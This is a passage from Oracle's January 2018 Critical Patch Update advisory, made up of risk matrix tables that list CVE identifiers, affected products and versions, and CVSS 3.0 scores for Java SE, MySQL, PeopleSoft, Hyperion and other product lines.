| CVE-2018-2604 | Oracle Hospitality Guest Access | Base | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 4.2.1 |  |
| CVE-2018-2589 | Oracle Hospitality Simphony | Enterprise Server | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 2.7, 2.8, 2.9 |  |
| CVE-2018-2672 | Oracle Hospitality Simphony | POS | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 2.7, 2.8, 2.9 |  |
| CVE-2018-2683 | Oracle Hospitality Simphony | POS | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 2.7, 2.8, 2.9 |  |
| CVE-2018-2650 | Oracle Hospitality Reporting and Analytics | Report | HTTP | No | 7.1 | Network | Low | Low | None | Un- changed | Low | High | None | 8.5.1, 9.0.0 |  |
| CVE-2018-2619 | Oracle Hospitality Simphony | Security | HTTP | No | 6.5 | Network | Low | Low | None | Un- changed | High | None | None | 2.7 |  |
| CVE-2018-2606 | Oracle Hospitality Guest Access | Base | None | No | 6.2 | Local | Low | None | None | Un- changed | High | None | None | 4.2.0, 4.2.1 |  |
| CVE-2018-2669 | Oracle Hospitality Reporting and Analytics | Report | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 8.5.1, 9.0.0 |  |
| CVE-2018-2673 | Oracle Hospitality Simphony | POS | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 2.7, 2.8, 2.9 |  |
| CVE-2018-2607 | Oracle Hospitality Guest Access | Base | HTTP | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 4.2.1 |  |

#### Additional CVEs addressed are below:

* The fix for CVE-2017-0781 also addresses CVE-2017-0782, CVE-2017-0783 and CVE-2017-0785.
* The fix for CVE-2017-13077 also addresses CVE-2017-13078, CVE-2017-13079, CVE-2017-13080, CVE-2017-13081 and CVE-2017-13082.

### Oracle Hyperion Risk Matrix

This Critical Patch Update contains 4 new security fixes for Oracle Hyperion. 1 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#HYP).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2018-2733 | Oracle Hyperion Planning | Security | HTTP | No | 7.6 | Network | High | High | Required | Changed | High | High | High | 11.1.2.4.007 |  |
| CVE-2018-2610 | Hyperion Data Relationship Management | Access and security | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | 11.1.2.4.330 |  |
| CVE-2018-2594 | Hyperion BI+ | Foundation UI & Servlets | HTTP | No | 4.3 | Network | Low | High | Required | Un- changed | Low | Low | Low | 11.1.2.4 |  |
| CVE-2018-2595 | Hyperion BI+ | Foundation UI & Servlets | HTTP | No | 4.3 | Network | Low | High | Required | Un- changed | Low | Low | Low | 11.1.2.4 |  |

### Oracle Java Micro Edition Risk Matrix

This Critical Patch Update contains 1 new security fix for Oracle Java Micro Edition. This vulnerability is not remotely exploitable without authentication, i.e., may not be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#JME).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2018-2569 | Java ME SDK | Installer | None | No | 7.8 | Local | Low | None | Required | Un- changed | High | High | High | 8.3 | See Note 1 |

#### Notes:

1. This applies to the Windows platform only.

### Oracle Java SE Risk Matrix

This Critical Patch Update contains 21 new security fixes for Oracle Java SE. 18 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#JAVA).

The CVSS scores below assume that a user running a Java applet or Java Web Start application has administrator privileges (typical on Windows). When the user does not run with administrator privileges (typical on Solaris and Linux), the corresponding CVSS impact scores for Confidentiality, Integrity, and Availability are "Low" instead of "High", lowering the CVSS Base Score. For example, a Base Score of 9.6 becomes 7.1.

Users should only use the default Java Plug-in and Java Web Start from the latest JDK or JRE 8 releases.

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2018-2638 | Java SE | Deployment | Multiple | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | Java SE: 8u152, 9.0.1 | See Note 1 |
| CVE-2018-2639 | Java SE | Deployment | Multiple | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | Java SE: 8u152, 9.0.1 | See Note 1 |
| CVE-2018-2633 | Java SE, Java SE Embedded, JRockit | JNDI | Multiple | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | Java SE: 6u171, 7u161, 8u152, 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16 | See Note 2 |
| CVE-2018-2627 | Java SE | Installer | None | No | 7.5 | Local | High | Low | Required | Changed | High | High | High | Java SE: 8u152, 9.0.1 | See Note 3 |
| CVE-2018-2637 | Java SE, Java SE Embedded, JRockit | JMX | Multiple | Yes | 7.4 | Network | High | None | None | Un- changed | High | High | None | Java SE: 6u171, 7u161, 8u152, 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16 | See Note 4 |
| CVE-2018-2634 | Java SE, Java SE Embedded | JGSS | Multiple | Yes | 6.8 | Network | High | None | None | Changed | High | None | None | Java SE: 7u161, 8u152, 9.0.1; Java SE Embedded: 8u151 | See Note 1 |
| CVE-2018-2582 | Java SE, Java SE Embedded | Hotspot | Multiple | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | High | None | Java SE: 8u152, 9.0.1; Java SE Embedded: 8u151 | See Note 2 |
| CVE-2018-2641 | Java SE, Java SE Embedded | AWT | Multiple | Yes | 6.1 | Network | High | None | Required | Changed | None | High | None | Java SE: 6u171, 7u161, 8u152, 9.0.1; Java SE Embedded: 8u151 | See Note 1 |
| CVE-2018-2618 | Java SE, Java SE Embedded, JRockit | JCE | Multiple | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | Java SE: 6u171, 7u161, 8u152, 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16 | See Note 2 |
| CVE-2018-2629 | Java SE, Java SE Embedded, JRockit | JGSS | Multiple | Yes | 5.3 | Network | High | None | Required | Un- changed | None | High | None | Java SE: 6u171, 7u161, 8u152, 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16 | See Note 2 |
| CVE-2018-2603 | Java SE, Java SE Embedded, JRockit | Libraries | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | Java SE: 6u171, 7u161, 8u152, 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16 | See Note 2 |
| CVE-2018-2657 | Java SE, JRockit | Serialization | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | Java SE: 6u171, 7u161; JRockit: R28.3.16 | See Note 4 |
| CVE-2018-2599 | Java SE, Java SE Embedded, JRockit | JNDI | Multiple | Yes | 4.8 | Network | High | None | None | Un- changed | None | Low | Low | Java SE: 6u171, 7u161, 8u152, 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16 | See Note 2 |
| CVE-2018-2581 | Java SE | JavaFX | Multiple | Yes | 4.7 | Network | Low | None | Required | Changed | Low | None | None | Java SE: 7u161, 8u152, 9.0.1 | See Note 1 |
| CVE-2018-2602 | Java SE, Java SE Embedded | I18n | None | No | 4.5 | Local | High | None | Required | Un- changed | Low | Low | Low | Java SE: 6u171, 7u161, 8u152, 9.0.1; Java SE Embedded: 8u151 | See Note 1 |
| CVE-2018-2677 | Java SE, Java SE Embedded | AWT | Multiple | Yes | 4.3 | Network | Low | None | Required | Un- changed | None | None | Low | Java SE: 6u171, 7u161, 8u152, 9.0.1; Java SE Embedded: 8u151 | See Note 1 |
| CVE-2018-2678 | Java SE, Java SE Embedded, JRockit | JNDI | Multiple | Yes | 4.3 | Network | Low | None | Required | Un- changed | None | None | Low | Java SE: 6u171, 7u161, 8u152, 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16 | See Note 2 |
| CVE-2018-2588 | Java SE, Java SE Embedded, JRockit | LDAP | Multiple | No | 4.3 | Network | Low | Low | None | Un- changed | Low | None | None | Java SE: 6u171, 7u161, 8u152, 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16 | See Note 2 |
| CVE-2018-2663 | Java SE, Java SE Embedded, JRockit | Libraries | Multiple | Yes | 4.3 | Network | Low | None | Required | Un- changed | None | None | Low | Java SE: 6u171, 7u161, 8u152, 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16 | See Note 2 |
| CVE-2018-2675 | Java Advanced Management Console | Server | Multiple | Yes | 3.7 | Network | High | None | None | Un- changed | Low | None | None | Java Advanced Management Console: 2.8 |  |
| CVE-2018-2579 | Java SE, Java SE Embedded, JRockit | Libraries | Multiple | Yes | 3.7 | Network | High | None | None | Un- changed | Low | None | None | Java SE: 6u171, 7u161, 8u152, 9.0.1; Java SE Embedded: 8u151; JRockit: R28.3.16 | See Note 2 |

#### Notes:

1. This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator).
2. This vulnerability applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service.
3. This vulnerability applies to the Windows installer only.
4. This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service.

### Oracle JD Edwards Products Risk Matrix

This Critical Patch Update contains 2 new security fixes for Oracle JD Edwards Products. Both of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#JDE).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2018-2658 | JD Edwards EnterpriseOne Tools | Web Runtime SEC | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 9.2 |  |
| CVE-2018-2659 | JD Edwards EnterpriseOne Tools | Web Runtime SEC | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 9.2 |  |

### Oracle MySQL Risk Matrix

This Critical Patch Update contains 25 new security fixes for Oracle MySQL. 6 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#MSQL).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2017-12617 | MySQL Enterprise Monitor | Monitoring: General (Apache Tomcat) | HTTPS (HTTP over TLS) | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | 3.3.6.3293 and prior, 3.4.4.4226 and prior, 4.0.0.5135 and prior |  |
| CVE-2018-2585 | MySQL Connectors | Connector/Net | MySQL Protocol | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 6.9.9 and prior, 6.10.4 and prior |  |
| CVE-2018-2696 | MySQL Server | Server : Security : Privileges | MySQL Protocol | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 5.6.38 and prior, 5.7.20 and prior |  |
| CVE-2018-2562 | MySQL Server | Server : Partition | MySQL Protocol | No | 7.1 | Network | Low | Low | None | Un- changed | None | Low | High | 5.5.58 and prior, 5.6.38 and prior, 5.7.19 and prior |  |
| CVE-2018-2583 | MySQL Server | Stored Procedure | MySQL Protocol | No | 6.8 | Network | Low | High | None | Changed | None | None | High | 5.6.38 and prior, 5.7.20 and prior |  |
| CVE-2018-2612 | MySQL Server | InnoDB | MySQL Protocol | No | 6.5 | Network | Low | High | None | Un- changed | None | High | High | 5.6.38 and prior, 5.7.20 and prior |  |
| CVE-2018-2703 | MySQL Server | Server : Security : Privileges | MySQL Protocol | No | 6.5 | Network | Low | Low | None | Un- changed | None | None | High | 5.6.38 and prior, 5.7.20 and prior |  |
| CVE-2018-2622 | MySQL Server | Server: DDL | MySQL Protocol | No | 6.5 | Network | Low | Low | None | Un- changed | None | None | High | 5.5.58 and prior, 5.6.38 and prior, 5.7.20 and prior |  |
| CVE-2018-2573 | MySQL Server | Server: GIS | MySQL Protocol | No | 6.5 | Network | Low | Low | None | Un- changed | None | None | High | 5.6.38 and prior, 5.7.20 and prior |  |
| CVE-2018-2640 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 6.5 | Network | Low | Low | None | Un- changed | None | None | High | 5.5.58 and prior, 5.6.38 and prior, 5.7.20 and prior |  |
| CVE-2018-2665 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 6.5 | Network | Low | Low | None | Un- changed | None | None | High | 5.5.58 and prior, 5.6.38 and prior, 5.7.20 and prior |  |
| CVE-2018-2668 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 6.5 | Network | Low | Low | None | Un- changed | None | None | High | 5.5.58 and prior, 5.6.38 and prior, 5.7.20 and prior |  |
| CVE-2017-3736 | MySQL Connectors | Connector/ODBC (OpenSSL) | MySQL Protocol | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 5.3.9 and prior |  |
| CVE-2017-3736 | MySQL Enterprise Monitor | Monitoring: General (OpenSSL) | HTTPS (HTTP over TLS) | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 3.3.6.3293 and prior, 3.4.4.4226 and prior, 4.0.0.5135 and prior |  |
| CVE-2017-3737 | MySQL Server | Server: Packaging (OpenSSL) | MySQL Protocol | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 5.6.38 and prior, 5.7.20 and prior |  |
| CVE-2018-2647 | MySQL Server | Server: Replication | MySQL Protocol | No | 5.5 | Network | Low | High | None | Un- changed | None | Low | High | 5.6.38 and prior, 5.7.20 and prior |  |
| CVE-2018-2591 | MySQL Server | Server : Partition | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 5.6.38 and prior, 5.7.19 and prior |  |
| CVE-2018-2576 | MySQL Server | Server: DML | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 5.7.20 and prior |  |
| CVE-2018-2586 | MySQL Server | Server: DML | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 5.7.20 and prior |  |
| CVE-2018-2646 | MySQL Server | Server: DML | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 5.7.20 and prior |  |
| CVE-2018-2565 | MySQL Server | Server: InnoDB | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 5.7.20 and prior |  |
| CVE-2018-2600 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 5.7.20 and prior |  |
| CVE-2018-2667 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 5.7.20 and prior |  |
| CVE-2018-2590 | MySQL Server | Server: Performance Schema | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 5.6.38 and prior, 5.7.20 and prior |  |
| CVE-2018-2645 | MySQL Server | Server: Performance Schema | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | High | None | None | 5.6.38 and prior, 5.7.20 and prior |  |

#### Additional CVEs addressed are below:

* The fix for CVE-2017-3736 also addresses CVE-2017-3735.
* The fix for CVE-2017-3737 also addresses CVE-2017-3738.

### Oracle PeopleSoft Products Risk Matrix

This Critical Patch Update contains 15 new security fixes for Oracle PeopleSoft Products. 8 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#PS).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2017-5645 | PeopleSoft Enterprise FIN Supply Chain Portal Pack Argentina | Supply Chain Portal Pack (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 9.1 |  |
| CVE-2017-5645 | PeopleSoft Enterprise FIN Supply Chain Portal Pack Brazil | Supply Chain Portal Pack (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 9.1 |  |
| CVE-2018-2593 | PeopleSoft Enterprise PeopleTools | PIA Core Technology | HTTP | Yes | 8.8 | Network | Low | None | Required | Un- changed | High | High | High | 8.54, 8.55, 8.56 |  |
| CVE-2017-10301 | PeopleSoft Enterprise PRTL Interaction Hub | Enterprise Portal | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | High | High | None | 9.1.00 |  |
| CVE-2015-7940 | PeopleSoft Enterprise HCM Human Resources | Install (Bouncy Castle Java package) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 9.1, 9.2 |  |
| CVE-2018-2652 | PeopleSoft Enterprise PeopleTools | Integration Broker | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 8.54, 8.55, 8.56 |  |
| CVE-2018-2651 | PeopleSoft Enterprise PeopleTools | XML Publisher | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 8.54, 8.55, 8.56 |  |
| CVE-2018-2702 | PeopleSoft Enterprise FSCM | Strategic Sourcing | HTTP | No | 6.5 | Network | Low | Low | None | Un- changed | High | None | None | 9.2 |  |
| CVE-2018-2605 | PeopleSoft Enterprise PeopleTools | Integration Broker | HTTP | No | 6.5 | Network | Low | Low | None | Un- changed | High | None | None | 8.54, 8.55, 8.56 |  |
| CVE-2018-2695 | PeopleSoft Enterprise PeopleTools | Query | HTTP | No | 6.5 | Network | Low | Low | None | Un- changed | High | None | None | 8.54, 8.55, 8.56 |  |
| CVE-2018-2671 | PeopleSoft Enterprise SCM Purchasing | Supplier Registration | HTTP | No | 6.5 | Network | Low | Low | None | Un- changed | High | None | None | 9.2 |  |
| CVE-2018-2654 | PeopleSoft Enterprise HCM Human Resources | Company Dir / Org Chart Viewer | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 9.2 |  |
| CVE-2018-2681 | PeopleSoft Enterprise HCM Human Resources | Security | HTTP | No | 5.4 | Network | Low | Low | None | Un- changed | Low | Low | None | 9.2 |  |
| CVE-2018-2731 | PeopleSoft Enterprise SCM eProcurement | Manage Requisition Status | HTTP | No | 5.4 | Network | Low | Low | None | Un- changed | Low | Low | None | 9.1, 9.2 |  |
| CVE-2018-2653 | PeopleSoft Enterprise PeopleTools | Connected Query | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | 8.54, 8.55, 8.56 |  |

### Oracle Retail Applications Risk Matrix

This Critical Patch Update contains 12 new security fixes for Oracle Retail Applications. 9 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#RAPP).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2017-5645 | MICROS Relate CRM Software | Internal Operations (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 10.8.x, 11.4.x |  |
| CVE-2017-5645 | MICROS Retail XBRi Loss Prevention | Retail (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 10.0.1, 10.5.0, 10.6.0, 10.7.0, 10.8.0, 10.8.1 |  |
| CVE-2017-5645 | Oracle Retail Assortment Planning | Application Core (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 14.1.3, 15.0.3, 16.0.1 |  |
| CVE-2017-5645 | Oracle Retail Convenience and Fuel POS Software | OPT Server (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 2.1.132 |  |
| CVE-2017-5645 | Oracle Retail Customer Management and Segmentation Foundation | Internal Operations (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 16.0.x |  |
| CVE-2017-5645 | Oracle Retail Fiscal Management | NF Issuing (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 14.1 |  |
| CVE-2017-5645 | Oracle Retail Workforce Management | Configuration Issues (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.60.7, 1.64.0 |  |
| CVE-2016-0635 | Converged Commerce | Foundation Data | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 16.0.1 |  |
| CVE-2016-9878 | Oracle Retail Assortment Planning | Operations & Maintenance (Spring Framework) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 14.1.3, 15.0.3, 16.0.1 |  |
| CVE-2017-12617 | MICROS Retail XBRi Loss Prevention | Retail (Apache Tomcat) | HTTP | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | 10.0.1, 10.5.0, 10.6.0, 10.7.0, 10.8.0, 10.8.1 |  |
| CVE-2017-5664 | MICROS Relate CRM Software | Web Services (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | High | None | 10.8.x, 11.4.x |  |
| CVE-2018-2730 | Oracle Retail Merchandising System | Cross Pillar | HTTP | No | 6.4 | Network | Low | Low | None | Changed | Low | Low | None | 16.0 |  |

#### Additional CVEs addressed are below:

* The fix for CVE-2017-5664 also addresses CVE-2016-8735.

### Oracle Siebel CRM Risk Matrix

This Critical Patch Update contains 2 new security fixes for Oracle Siebel CRM. Neither of these vulnerabilities may be remotely exploitable without authentication, i.e., neither may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#SECR).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2018-2574 | Siebel CRM Desktop | Outlook Client | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | High | High | None | 16.0, 17.0 |  |
| CVE-2018-2632 | Siebel Engineering - Installer & Deployment | Siebel Approval Manager | HTTP | No | 4.3 | Network | Low | Low | None | Un- changed | Low | None | None | 16.0, 17.0 |  |

### Oracle Sun Systems Products Suite Risk Matrix

This Critical Patch Update contains 13 new security fixes for the Oracle Sun Systems Products Suite. 7 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#SUNS).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2018-2611 | Sun ZFS Storage Appliance Kit (AK) | Core Services | HTTP | Yes | 10.0 | Network | Low | None | None | Changed | High | High | High | Prior to 8.7.13 |  |
| CVE-2018-2623 | Sun ZFS Storage Appliance Kit (AK) | User Interface | HTTP | Yes | 9.3 | Network | Low | None | None | Changed | High | Low | None | Prior to 8.7.13 |  |
| CVE-2018-2664 | Sun ZFS Storage Appliance Kit (AK) | User Interface | HTTP | Yes | 9.0 | Network | High | None | None | Changed | High | High | High | Prior to 8.7.13 |  |
| CVE-2018-2624 | Sun ZFS Storage Appliance Kit (AK) | User Interface | HTTP | Yes | 8.6 | Network | Low | None | None | Changed | High | None | None | Prior to 8.7.13 |  |
| CVE-2016-0704 | Integrated Lights Out Manager (ILOM) | System Management (Glibc, OpenSSL) | HTTP | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | 3.x, 4.x |  |
| CVE-2018-2566 | Integrated Lights Out Manager (ILOM) | Remote Console Application | TLS | No | 7.7 | Network | High | Low | Required | Changed | High | High | None | 3.x, 4.x |  |
| CVE-2018-2710 | Solaris | Kernel | ICMP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 10 |  |
| CVE-2018-2568 | Integrated Lights Out Manager (ILOM) | Remote Console Application | TLS | Yes | 7.3 | Network | Low | None | None | Un- changed | Low | Low | Low | 3.x, 4.x |  |
| CVE-2018-2578 | Solaris | Kernel | None | No | 7.2 | Local | High | High | Required | Changed | High | High | High | 11.3 |  |
| CVE-2018-2717 | Solaris | SPARC Platform | None | No | 6.6 | Local | Low | Low | Required | Un- changed | High | High | None | 10, 11.3 |  |
| CVE-2017-5715 | Oracle X86 Servers | BIOS | None | No | 5.6 | Local | High | Low | None | Changed | High | None | None | SW 1.x, SW 2.x | See Note 1 |
| CVE-2018-2577 | Solaris | Kernel | None | No | 5.5 | Local | Low | Low | None | Un- changed | High | None | None | 11.3 |  |
| CVE-2018-2560 | Solaris | Kernel | None | No | 5.0 | Local | High | High | Required | Changed | High | None | None | 11.3 |  |

#### Notes:

1. This includes Intel microcode that enables OS and VM level mitigations for CVE-2017-5715. Application of firmware patches to pick up the Intel microcode is required only for Oracle x86 servers using non Oracle OS and Virtualization software. Oracle OS and Oracle VM patches for CVE-2017-5715 will include updated Intel microcode.

#### Additional CVEs addressed are below:

* The fix for CVE-2016-0704 also addresses CVE-2014-7817, CVE-2014-9402, CVE-2015-0293, CVE-2015-1472, CVE-2015-3195, CVE-2015-7547, CVE-2016-0703 and CVE-2016-0800.

### Oracle Supply Chain Products Suite Risk Matrix

This Critical Patch Update contains 14 new security fixes for the Oracle Supply Chain Products Suite. 12 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2018verbose.html#SCP).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2017-5645 | Agile Material and Equipment Management for Pharmaceuticals | Administration (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 9.3.3, 9.3.4 |  |
| CVE-2017-5645 | Oracle Agile Engineering Data Management | Internal Operations (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 6.1.3, 6.2.0, 6.2.1 |  |
| CVE-2017-5645 | Oracle Agile PLM | Security (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 9.3.3, 9.3.4, 9.3.5, 9.3.6 |  |
